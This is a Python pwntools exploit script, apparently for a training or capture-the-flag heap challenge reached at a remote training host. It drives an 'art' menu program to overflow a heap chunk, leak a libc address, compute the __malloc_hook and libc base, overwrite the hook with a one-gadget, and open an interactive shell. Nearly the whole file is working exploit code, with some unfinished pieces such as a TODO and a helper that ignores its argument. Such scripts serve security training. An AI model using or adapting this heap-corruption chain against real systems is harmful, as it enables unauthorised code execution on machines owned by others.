from pwn import *
### Run w/: REMOTE, DEBUG, NOPTRACE (disable gdb stuff)

### Context variables for setup

binary_name = './test'

## Detect automatically arch, bit width and endiannes from the binary
context.binary = binary_name


## Make output verbose. Set to INFO to change to normal.
#context.log_level = 'DEBUG';

### Process attach to file or remote. Run `python pwn.py REMOTE` 

def start_process():
    if args.REMOTE:

        ## If connection has to happen through ssh:
        # ssh = ("user", "ip")
        # return ssh.process(binary_name)
        return connect("bin.training.jinblack.it", 3004 )

    else:
        return process(binary_name)

r = start_process()
gdb.attach(r, '''
b menu
x/1x &__malloc_hook
''')

# Malloc 0x20
#



#input("Waiting until keypress")
### Create recv primitives

## Receive up to x number of bytes. Can take a timeout in order not to hang.
#p.recv(x) 

## Receive a line (up to '\n'). 
## Keeps the '\n' in the returned string unlss passed False.
# p.recvline() 

## Reveice data until string is reached. If passed True drops the delimiter.
#p.recvuntil('String')

## Receive up to EOF.
#p.recvall() 

#p.recvuntil('access!\n')

## Format a 32 or 64bit address correctly to bytes.
def faddr(address):
    if (context.bits == 32): 
        return p32(0x08049276)
    else:
        return p64(0x08049276)


### Code to generate a pattern and see where the program crashes to find padding offset.

def newArt(name, size, artData):
    r.recvuntil(b"> ")
    r.sendline(b"0")
    r.recvuntil(b"name> ")
    r.sendline(b"%s" % name)
    r.recvuntil(b"art sz> ")
    r.sendline(b"%d" % size)
    input("Waiting until keypress")
    r.sendline(artData)
    return

def editArt(index, name, size, artData):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"art#> ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"name> ")
    r.sendline(b"%s" % name)
    r.recvuntil(b"art sz> ")
    r.sendline(b"%d" % size)
    input("Waiting until keypress")
    r.send(artData)

def printArt(index):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"art#> ")
    r.sendline(b"%d" % index)
    title = str(r.recvline())
    title = title.replace("***", "").rstrip()
    artData = r.recv(0xd0)
    artData = r.recv(0x8)
    return artData

def deleteArt(index):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"art#> ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"was deleted\n")

def recMenu():
    r.recvuntil(b"Exit\n")


recMenu() #First print




newArt(b"One", 0x20, b"A"*(0x20-1))
recMenu()

newArt(b"Two", 0x20, b"B"*(0x20-1))
recMenu()


newArt(b"Three", 0x20, b"C"*(0x20-1))
recMenu()

newArt(b"Four", 0x550, b"Z"*(0x550-1))
recMenu()

deleteArt(4)
recMenu()

## TODO

#editArt(3, b"Three", 0xe2+1, b"F"*(0x20) + p64(0) + p64(31) + p64(0) + p64(20)+b"G"*(0xb0- 0x20 -1))
editArt(3, b"Three", 0xe2+1, b"F"*(0x20)+p64(0)+p64(0x31)+p64(0)+p64(0xe2))
recMenu()

leak = printArt(3)
print("Leak: " + hex(u64(leak)))
hookoffset = 0x7ffff7bebca0 - 0x7ffff7bebc30 #malloc hook 
mallochook = u64(leak) - hookoffset #malloc hook 
print("Malloc Hook: " + hex(mallochook))
libcoffset = 0x7ffff7bebca0 - 0x7ffff7800000 #malloc hook 
libcbase = u64(leak) - libcoffset #malloc hook 
print("Libc Base: " + hex(libcbase))
onegadget = libcbase + 0x4f2c5
onegadget = libcbase + 0x4f322
print("One gadget: " + hex(onegadget))
chunk = p64(0) + p64(0x31) + p64(1) + p64(20) + p64(1) + p64(1) + p64(0) + p64(71) + p64(mallochook)

recMenu()

deleteArt(3)
recMenu()

deleteArt(2)
recMenu()

overwrite = b"A"*(0x20) + chunk

editArt(1, b"One", len(overwrite)+1, overwrite)
recMenu()

newArt(p64(mallochook), 0x50, b"D"*(0x50-1))
recMenu()

newArt(p64(onegadget), 0x50, b"whoami")




r.interactive()
